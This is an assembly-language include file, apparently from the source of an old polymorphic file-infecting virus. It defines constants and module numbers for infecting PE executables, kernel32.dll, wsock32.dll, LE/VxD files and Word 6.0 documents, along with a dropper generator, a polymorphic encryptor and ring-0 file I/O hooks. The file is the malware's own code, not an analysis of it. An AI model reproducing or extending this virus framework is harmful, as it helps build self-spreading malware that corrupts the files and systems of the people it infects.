; start up loaders

MODULES_CNT = 32

module_refs  dd MODULES_CNT dup (0)     ; not changeable

; ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออธ
; constant values
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

; host_type values
HOST_UNKNOWN            = 0
HOST_VXD                = 1     ; runs under VxD
HOST_LEEXE              = 2     ; runs under LE DOS4GW EXE
HOST_DOSEXE             = 3     ; runs under DOS
HOST_PEDRP              = 4     ; runs under PE as a dropper (no CreateFileA found)
HOST_PEFULL             = 5     ; runs under PE as a resident

; system values
SYS_DOS   = 1                   ; runs under DOS
SYS_WIN95 = 2                   ; runs under Windows 95
SYS_WINNT = 4                   ; runs under Windows NT


; messages
; md_infLE infection types
INF_VXD = 0                     ; infect file as VxD
INF_DOS4 = 1                    ; infect file as DOS4 EXE

; md_infPE infection types
INF_NT_EXE = 0                  ; infect PE executable
INF_NT_SYS = 1                  ; infect PE sys file (under construction)
INF_NT_KRNL = 2                 ; infect PE kernel32.dll
INF_NT_WSOCK = 3                ; infect PE wsock32.dll


; md_poly options
POLY_STD         = 0            ; no special options
POLY_DROPPER     = 1            ; enables strategy
POLY_FIXED_ENTRY = 2            ; can not move entry point (not solved yet)
POLY_HANDLER     = 4            ; routine will be handler



; ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออธ
; module numbers
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
md_initVxD   = 0  ; resident under VxD
md_initNWXT  = 1  ; resident under DOS
md_initDOS4  = 2  ; dropper under DOS4GW
md_initPE    = 3  ; resident/dropper in PE
md_startup   = 4  ; startup routinez
md_infEXE    = 5  ; NOPE
md_infDOC    = 6  ; infection of word 6.0 documents
md_infLE     = 7  ; infection of LE files (VxDs, DOS4GW)
md_infPE     = 8  ; infection of PE files (Win NT EXE, [SYS])
md_infPAK    = 9  ; NOPE
md_hookVxD   = 10 ; NOPE
md_hookNT    = 11 ; NOPE
md_hookBOOT  = 12 ; NOPE
md_strategy  = 13 ; main strategy routinez
md_gen_drop  = 14 ; dropper generator
md_poly      = 15 ; poly encryptor
md_rand      = 16 ; random number generator
; reserved
md_alloc     = 17 ; buffer allocation and deallocation
md_last      = 30 ; terminator (size of this file)
md_commsize  = 31 ; maximal size of common buffer

md_initsys   = 18 ; ---- not in this version ----
md_initkrnl  = 19 ; ---- under  construction ----
md_initwsock = 20 ; ---- not in this version ----

body_len     = module_refs[4*md_last] ; total size of body
cmn_buf_len  = module_refs[4*md_commsize] ; maximal size of common buffer


; ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออธ
; other variables
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

Ring0_FileIO  dd 0              ; active FileIO (auto init)
module_loader dd 0              ; ptr to module loader (auto_init)
module_open   dd 0              ; force module to be opened
module_close  dd 0              ; force module to be closed
mirrorize     dd 0              ; mirrorize whole code module to edi (regz will be destroyed)

initialize    db 0              ; 1 if initialization phase otherwise 0 (auto_init)

rand_seed     dd 0

host_type     db HOST_UNKNOWN   ; host info
system        db SYS_WIN95 or SYS_WINNT
subsystem     db 0
std_W95_dir   dd dirW95          ; non auto updatable
std_WNT_dir   dd dirWNT          ; non auto updatable

dirW95        db 'C:\WINDOWS',0
dirWNT        db 'C:\WINNT',0





include vxdsup.inc
include main.inc

mod_call     macro mod_id
             push mod_id
             call dword ptr module_loader
             endm

